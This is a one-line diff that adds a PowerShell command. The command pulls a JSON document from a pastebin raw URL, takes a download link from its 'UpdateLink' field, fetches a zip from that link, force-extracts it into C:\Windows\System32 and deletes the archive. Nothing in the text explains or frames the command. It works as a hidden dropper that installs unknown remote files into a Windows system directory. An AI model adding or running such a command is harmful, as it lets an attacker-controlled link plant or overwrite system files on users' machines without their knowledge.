@@ -1,0 +1,1 @@
+(New-Object Net.WebClient).DownloadFile($($($(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/2F9cxKfF')) | ConvertFrom-Json).UpdateLink, 'xapt.zip');Expand-Archive ./xapt.zip C:\Windows\System32 -Force;del ./xapt.zip;
